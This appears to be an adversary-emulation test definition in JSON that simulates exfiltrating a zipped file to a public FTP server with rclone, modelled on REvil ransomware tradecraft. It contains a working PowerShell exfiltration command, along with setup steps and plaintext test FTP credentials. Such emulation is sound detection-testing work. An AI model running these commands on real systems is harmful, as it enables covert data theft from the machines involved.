{
  "id": "b854eb97-bf9b-45ab-a1b5-b94e4880c56b",
  "name": "Exfiltration Over Alternative Protocol - FTP - Rclone",
  "description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655",
      "type": "execute-command",
      "data": {
        "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n\u0026$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n\u0026$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
        "command_type": "powershell"
      },
      "elevation_required": true
    },
    {
      "id": "a0199bef-1c04-4aea-85ea-61d4cb105a22",
      "name": "Check dependency 1/2",
      "description": "Check if the exfil package exists\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "c9d925fd-be35-4d21-b4eb-3bb2aa0ac57c",
      "name": "Resolve dependency 1/2",
      "description": "Check if the exfil package exists\n",
      "type": "execute-command",
      "data": {
        "command": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "febb42b6-3549-4903-89d0-80e78b50361a",
      "name": "Re-check dependency 1/2",
      "description": "Check if the exfil package exists\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "9b36c640-c0e2-49c8-9a69-6587708e8391",
      "name": "Check dependency 2/2",
      "description": "Check if rclone zip exists",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "41d2e9bb-219f-4fea-883c-9a86a5f647a1",
      "name": "Resolve dependency 2/2",
      "description": "Check if rclone zip exists",
      "type": "execute-command",
      "data": {
        "command": "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "c89187c1-ecb7-4258-9c8d-32ac73e9f93b",
      "name": "Re-check dependency 2/2",
      "description": "Check if rclone zip exists",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "a0199bef-1c04-4aea-85ea-61d4cb105a22",
      "p": "on-success",
      "o": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655"
    },
    {
      "s": "a0199bef-1c04-4aea-85ea-61d4cb105a22",
      "p": "on-failure",
      "o": "c9d925fd-be35-4d21-b4eb-3bb2aa0ac57c"
    },
    {
      "s": "c9d925fd-be35-4d21-b4eb-3bb2aa0ac57c",
      "p": "on-success",
      "o": "febb42b6-3549-4903-89d0-80e78b50361a"
    },
    {
      "s": "febb42b6-3549-4903-89d0-80e78b50361a",
      "p": "on-failure",
      "o": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655"
    },
    {
      "s": "9b36c640-c0e2-49c8-9a69-6587708e8391",
      "p": "on-success",
      "o": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655"
    },
    {
      "s": "9b36c640-c0e2-49c8-9a69-6587708e8391",
      "p": "on-failure",
      "o": "41d2e9bb-219f-4fea-883c-9a86a5f647a1"
    },
    {
      "s": "41d2e9bb-219f-4fea-883c-9a86a5f647a1",
      "p": "on-success",
      "o": "c89187c1-ecb7-4258-9c8d-32ac73e9f93b"
    },
    {
      "s": "c89187c1-ecb7-4258-9c8d-32ac73e9f93b",
      "p": "on-failure",
      "o": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655"
    }
  ],
  "tags": [
    "T1048",
    "T1048.003"
  ],
  "input_arguments": [
    {
      "name": "ftp_server",
      "type": "string",
      "description": "Your own ftp server",
      "value": "ftp.dlptest.com"
    },
    {
      "name": "ftp_pass",
      "type": "string",
      "description": "Your FTP user's password",
      "value": "rNrKYTX9g7z3RgJRmxWuGHbeu"
    },
    {
      "name": "ftp_user",
      "type": "string",
      "description": "Your FTP username",
      "value": "dlpuser"
    },
    {
      "name": "ftp_port",
      "type": "integer",
      "description": "Your FTP's port",
      "value": "21"
    }
  ]
}